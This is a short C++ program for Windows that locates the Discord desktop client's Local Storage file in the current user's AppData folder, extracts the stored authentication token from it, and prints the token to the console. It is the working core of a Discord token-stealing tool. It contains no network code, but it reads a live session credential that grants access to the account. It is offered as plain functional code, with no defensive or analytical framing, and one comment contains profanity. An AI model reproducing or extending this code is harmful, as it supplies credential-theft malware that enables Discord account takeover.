#include "stdafx.h"
#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#define UNLEN 64


using namespace std;

bool isrealchar(int charNum)
{
	if (charNum > 32 && charNum < 127) return true;
	else return false;
}

bool creepyStrToRealChar(ifstream &fileToReadFrom, string *stringOut) //needed to strip these FUCKIGGNEFDNFS NUL!!!
{
	if (fileToReadFrom.is_open())
	{
		int c;
		while ((c = fileToReadFrom.get()) != EOF) { //while succesful read
			if (isrealchar(c))
				*stringOut += c; // then write the line in the output file 
		}
		fileToReadFrom.close();
		return 1;
	}
	else return 0;
}

std::string ExtractString(std::string source, std::string start, std::string end)
{
	std::size_t startIndex = source.find(start);
	if (startIndex == std::string::npos)
	{
		return "";
	}
	startIndex += start.length();
	std::string::size_type endIndex = source.find(end, startIndex);
	return source.substr(startIndex, endIndex - startIndex);
}
std::string ws2s(const std::wstring& wstr)
{
	int size_needed = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), int(wstr.length() + 1), 0, 0, 0, 0);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), int(wstr.length() + 1), &strTo[0], size_needed, 0, 0);
	return strTo;
}

std::string getUsername()
{
	string usernameFound;
	
	char* ChrUserName;
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	string Username = ws2s(username);
	const char* CHRrealUsrNm=Username.c_str();
	for (int i = 0; i < Username.length()-1; i++)
	{
		usernameFound += CHRrealUsrNm[i];
	}
	return usernameFound;
}
int main(int argc, char *argv[])
{
	string textStr;
	string search = "token";
	string username = getUsername();
	cout << "Your username is: " << username << endl;
	string discordPath = "C:\\Users\\" + username + "\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
	cout << "The path for discordDB is: " << discordPath << endl;
	ifstream myfile(discordPath);
	if (!creepyStrToRealChar(myfile, &textStr))
	{
		cout << "Cannot load file!" << endl;
		getchar();
		return -1;
	}
	//cout << textStr << endl;
	string token = ExtractString(textStr,"token\"","\"");
	cout << "Hey kiddo! Your token is: " << token << endl;
	getchar();
	return 0;
}